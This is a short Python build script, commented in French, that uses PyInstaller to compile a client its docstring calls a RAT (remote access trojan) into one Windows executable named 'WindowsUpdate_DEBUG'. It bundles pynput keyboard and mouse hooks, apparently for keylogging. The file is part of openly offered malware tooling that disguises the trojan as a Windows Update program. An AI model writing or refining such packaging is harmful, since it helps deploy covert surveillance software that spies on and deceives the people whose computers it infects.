import PyInstaller.__main__
import os

def compile_client_debug():
    """Compile le client RAT en mode DEBUG avec console visible"""
    
    output_name = "WindowsUpdate_DEBUG"
    
    PyInstaller.__main__.run([
        "client.py",
        "--onefile",
        # PAS de --noconsole pour voir les erreurs
        f"--name={output_name}",
        "--clean",
        "--optimize=0",  # Pas d'optimisation pour debug
        "--hidden-import=pynput.keyboard._win32",
        "--hidden-import=pynput.mouse._win32",
        "--hidden-import=logger",
        "--add-data=config.py;.",
    ])
    print(f"[+] Client DEBUG compilé: dist/{output_name}.exe")
    print(f"[+] Ce fichier affiche la console pour voir les erreurs!")


if __name__ == "__main__":
    compile_client_debug()
